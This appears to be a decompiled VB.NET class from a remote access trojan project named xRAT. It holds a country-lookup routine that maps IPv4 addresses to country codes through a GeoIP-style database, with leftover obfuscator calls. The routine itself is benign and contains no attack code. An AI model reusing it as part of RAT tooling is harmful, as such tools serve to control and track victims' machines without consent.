Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.IO
Imports System.Net

Namespace xRAT
    Public Class CountryLookup
        ' Methods
        Shared Sub New()
            Class1.QaIGh5M7cuigS
            CountryLookup.long_0 = &HFFFF00
            CountryLookup.string_0 = New String() { "N/A", "Asia/Pacific Region", "Europe", "Andorra", "United Arab Emirates", "Afghanistan", "Antigua and Barbuda", "Anguilla", "Albania", "Armenia", "Netherlands Antilles", "Angola", "Antarctica", "Argentina", "American Samoa", "Austria", "Australia", "Aruba", "Azerbaijan", "Bosnia and Herzegovina", "Barbados", "Bangladesh", "Belgium", "Burkina Faso", "Bulgaria", "Bahrain", "Burundi", "Benin", "Bermuda", "Brunei Darussalam", "Bolivia", "Brazil", "Bahamas", "Bhutan", "Bouvet Island", "Botswana", "Belarus", "Belize", "Canada", "Cocos (Keeling) Islands", "Congo, The Democratic Republic of the", "Central African Republic", "Congo", "Switzerland", "Cote D'Ivoire", "Cook Islands", "Chile", "Cameroon", "China", "Colombia", "Costa Rica", "Cuba", "Cape Verde", "Christmas Island", "Cyprus", "Czech Republic", "Germany", "Djibouti", "Denmark", "Dominica", "Dominican Republic", "Algeria", "Ecuador", "Estonia", "Egypt", "Western Sahara", "Eritrea", "Spain", "Ethiopia", "Finland", "Fiji", "Falkland Islands (Malvinas)", "Micronesia, Federated States of", "Faroe Islands", "France", "France, Metropolitan", "Gabon", "United Kingdom", "Grenada", "Georgia", "French Guiana", "Ghana", "Gibraltar", "Greenland", "Gambia", "Guinea", "Guadeloupe", "Equatorial Guinea", "Greece", "South Georgia and the South Sandwich Islands", "Guatemala", "Guam", "Guinea-Bissau", "Guyana", "Hong Kong", "Heard Island and McDonald Islands", "Honduras", "Croatia", "Haiti", "Hungary", "Indonesia", "Ireland", "Israel", "India", "British Indian Ocean Territory", "Iraq", "Iran, Islamic Republic of", "Iceland", "Italy", "Jamaica", "Jordan", "Japan", "Kenya", "Kyrgyzstan", "Cambodia", "Kiribati", "Comoros", "Saint Kitts and Nevis", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Cayman Islands", "Kazakstan", "Lao People's Democratic Republic", "Lebanon", "Saint Lucia", "Liechtenstein", "Sri Lanka", "Liberia", "Lesotho", "Lithuania", "Luxembourg", "Latvia", "Libyan Arab Jamahiriya", "Morocco", "Monaco", "Moldova, Republic of", "Madagascar", "Marshall Islands", "Macedonia, the Former Yugoslav Republic of", "Mali", "Myanmar", "Mongolia", "Macao", "Northern Mariana Islands", "Martinique", "Mauritania", "Montserrat", "Malta", "Mauritius", "Maldives", "Malawi", "Mexico", "Malaysia", "Mozambique", "Namibia", "New Caledonia", "Niger", "Norfolk Island", "Nigeria", "Nicaragua", "Netherlands", "Norway", "Nepal", "Nauru", "Niue", "New Zealand", "Oman", "Panama", "Peru", "French Polynesia", "Papua New Guinea", "Philippines", "Pakistan", "Poland", "Saint Pierre and Miquelon", "Pitcairn", "Puerto Rico", "Palestinian Territory, Occupied", "Portugal", "Palau", "Paraguay", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saudi Arabia", "Solomon Islands", "Seychelles", "Sudan", "Sweden", "Singapore", "Saint Helena", "Slovenia", "Svalbard and Jan Mayen", "Slovakia", "Sierra Leone", "San Marino", "Senegal", "Somalia", "Suriname", "Sao Tome and Principe", "El Salvador", "Syrian Arab Republic", "Swaziland", "Turks and Caicos Islands", "Chad", "French Southern Territories", "Togo", "Thailand", "Tajikistan", "Tokelau", "Turkmenistan", "Tunisia", "Tonga", "Timor-Leste", "Turkey", "Trinidad and Tobago", "Tuvalu", "Taiwan, Province of China", "Tanzania, United Republic of", "Ukraine", "Uganda", "United States Minor Outlying Islands", "United States", "Uruguay", "Uzbekistan", "Holy See (Vatican City State)", "Saint Vincent and the Grenadines", "Venezuela", "Virgin Islands, British", "Virgin Islands, U.S.", "Vietnam", "Vanuatu", "Wallis and Futuna", "Samoa", "Yemen", "Mayotte", "Yugoslavia", "South Africa", "Zambia", "Montenegro", "Zimbabwe", "Anonymous Proxy", "Satellite Provider", "Other", "Aland Islands", "Guernsey", "Isle of Man", "Jersey", "Saint Barthelemy", "Saint Martin" }
            CountryLookup.string_1 = New String() { "--", "AP", "EU", "AD", "AE", "AF", "AG", "AI", "AL", "AM", "AN", "AO", "AQ", "AR", "AS", "AT", "AU", "AW", "AZ", "BA", "BB", "BD", "BE", "BF", "BG", "BH", "BI", "BJ", "BM", "BN", "BO", "BR", "BS", "BT", "BV", "BW", "BY", "BZ", "CA", "CC", "CD", "CF", "CG", "CH", "CI", "CK", "CL", "CM", "CN", "CO", "CR", "CU", "CV", "CX", "CY", "CZ", "DE", "DJ", "DK", "DM", "DO", "DZ", "EC", "EE", "EG", "EH", "ER", "ES", "ET", "FI", "FJ", "FK", "FM", "FO", "FR", "FX", "GA", "GB", "GD", "GE", "GF", "GH", "GI", "GL", "GM", "GN", "GP", "GQ", "GR", "GS", "GT", "GU", "GW", "GY", "HK", "HM", "HN", "HR", "HT", "HU", "ID", "IE", "IL", "IN", "IO", "IQ", "IR", "IS", "IT", "JM", "JO", "JP", "KE", "KG", "KH", "KI", "KM", "KN", "KP", "KR", "KW", "KY", "KZ", "LA", "LB", "LC", "LI", "LK", "LR", "LS", "LT", "LU", "LV", "LY", "MA", "MC", "MD", "MG", "MH", "MK", "ML", "MM", "MN", "MO", "MP", "MQ", "MR", "MS", "MT", "MU", "MV", "MW", "MX", "MY", "MZ", "NA", "NC", "NE", "NF", "NG", "NI", "NL", "NO", "NP", "NR", "NU", "NZ", "OM", "PA", "PE", "PF", "PG", "PH", "PK", "PL", "PM", "PN", "PR", "PS", "PT", "PW", "PY", "QA", "RE", "RO", "RU", "RW", "SA", "SB", "SC", "SD", "SE", "SG", "SH", "SI", "SJ", "SK", "SL", "SM", "SN", "SO", "SR", "ST", "SV", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TM", "TN", "TO", "TL", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC", "VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "RS", "ZA", "ZM", "ME", "ZW", "A1", "A2", "O1", "AX", "GG", "IM", "JE", "BL", "MF" }
        End Sub

        Public Sub New(ByVal ms As MemoryStream)
            Class1.QaIGh5M7cuigS
            Me._MemoryStream = ms
        End Sub

        Public Sub New(ByVal FileLocation As String)
            Class1.QaIGh5M7cuigS
            Dim stream As New FileStream(FileLocation, FileMode.Open, FileAccess.Read)
            Me._MemoryStream = New MemoryStream
            Dim array As Byte() = New Byte(&H101  - 1) {}
            Do While (stream.Read(array, 0, array.Length) <> 0)
                Me._MemoryStream.Write(array, 0, array.Length)
            Loop
            stream.Close
        End Sub

        Public Shared Function FileToMemory(ByVal FileLocation As String) As MemoryStream
            Dim stream As New FileStream(FileLocation, FileMode.Open, FileAccess.Read)
            Dim stream2 As New MemoryStream
            Dim array As Byte() = New Byte(&H101  - 1) {}
            Do While (stream.Read(array, 0, array.Length) <> 0)
                stream2.Write(array, 0, array.Length)
            Loop
            stream.Close
            Return stream2
        End Function

        Public Function LookupCountryCode(ByVal _IPAddress As IPAddress) As String
            Return CountryLookup.string_1(CInt(Me.method_4(0, Me.method_0(_IPAddress), &H1F)))
        End Function

        Public Function LookupCountryCode(ByVal _IPAddress As String) As String
            Dim str As String
            Try 
                Dim address As IPAddress = IPAddress.Parse(_IPAddress)
                Return Me.LookupCountryCode(address)
            Catch exception1 As FormatException
                ProjectData.SetProjectError(exception1)
                str = "--"
                ProjectData.ClearProjectError
            End Try
            Return str
        End Function

        Public Function LookupCountryName(ByVal addr As IPAddress) As String
            Return CountryLookup.string_0(CInt(Me.method_4(0, Me.method_0(addr), &H1F)))
        End Function

        Public Function LookupCountryName(ByVal _IPAddress As String) As String
            Dim str As String
            Try 
                Dim addr As IPAddress = IPAddress.Parse(_IPAddress)
                Return Me.LookupCountryName(addr)
            Catch exception1 As FormatException
                ProjectData.SetProjectError(exception1)
                str = "N/A"
                ProjectData.ClearProjectError
            End Try
            Return str
        End Function

        Private Function method_0(ByVal ipaddress_0 As IPAddress) As Long
            Dim array As String() = Strings.Split(ipaddress_0.ToString, ".", -1, CompareMethod.Binary)
            If (Information.UBound(array, 1) = 3) Then
                Return CLng(Math.Round(CDbl(((((16777216 * Conversions.ToDouble(array(0))) + (65536 * Conversions.ToDouble(array(1)))) + (256 * Conversions.ToDouble(array(2)))) + Conversions.ToDouble(array(3))))))
            End If
            Return 0
        End Function

        Private Function method_1(ByVal long_1 As Long) As String
            Dim str As String = Conversions.ToString(CDbl((Conversion.Int(CDbl((CDbl(long_1) / 16777216))) Mod 256)))
            Dim str2 As String = Conversions.ToString(CDbl((Conversion.Int(CDbl((CDbl(long_1) / 65536))) Mod 256)))
            Dim str3 As String = Conversions.ToString(CDbl((Conversion.Int(CDbl((CDbl(long_1) / 256))) Mod 256)))
            Dim str4 As String = Conversions.ToString(CLng((Conversion.Int(long_1) Mod &H100)))
            Return String.Concat(New String() { str, ".", str2, ".", str3, ".", str4 })
        End Function

        Private Function method_2(ByVal long_1 As Long, ByVal int_0 As Integer) As Long
            Dim num As Long = long_1
            Dim num2 As Integer = int_0
            Dim i As Integer = 1
            Do While (i <= num2)
                num = (num * 2)
                i += 1
            Loop
            Return num
        End Function

        Private Function method_3(ByVal long_1 As Long, ByVal int_0 As Integer) As Long
            Dim num As Long = long_1
            Dim num2 As Integer = int_0
            Dim i As Integer = 1
            Do While (i <= num2)
                num = (num / 2)
                i += 1
            Loop
            Return num
        End Function

        Private Function method_4(ByVal long_1 As Long, ByVal long_2 As Long, ByVal int_0 As Integer) As Long
            Dim num As Integer
            Dim buffer As Byte() = New Byte(7  - 1) {}
            Dim numArray As Long() = New Long(3  - 1) {}
            If (int_0 = 0) Then
            End If
            Try 
                Me._MemoryStream.Seek((6 * long_1), SeekOrigin.Begin)
                Me._MemoryStream.Read(buffer, 0, 6)
            Catch exception1 As IOException
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
            Dim index As Integer = 0
        Label_0092:
            numArray(index) = 0
            Dim num3 As Integer = 0
        Label_007B:
            num = buffer(((index * 3) + num3))
            If (num < 0) Then
                num = (num + &H100)
            End If
            Dim numArray2 As Long() = numArray
            Dim num4 As Integer = index
            numArray2(num4) = (numArray2(num4) + Me.method_2(CLng(num), (num3 * 8)))
            num3 += 1
            If (num3 > 2) Then
                index += 1
                If (index > 1) Then
                    If ((long_2 And Me.method_2(1, int_0)) > 0) Then
                        If (numArray(1) >= CountryLookup.long_0) Then
                            Return (numArray(1) - CountryLookup.long_0)
                        End If
                        Return Me.method_4(numArray(1), long_2, (int_0 - 1))
                    End If
                    If (numArray(0) >= CountryLookup.long_0) Then
                        Return (numArray(0) - CountryLookup.long_0)
                    End If
                    Return Me.method_4(numArray(0), long_2, (int_0 - 1))
                End If
            Else
                goto Label_007B
            End If
            goto Label_0092
        End Function


        ' Fields
        Public _MemoryStream As MemoryStream
        Private Shared long_0 As Long
        Private Shared string_0 As String()
        Private Shared string_1 As String()
    End Class
End Namespace

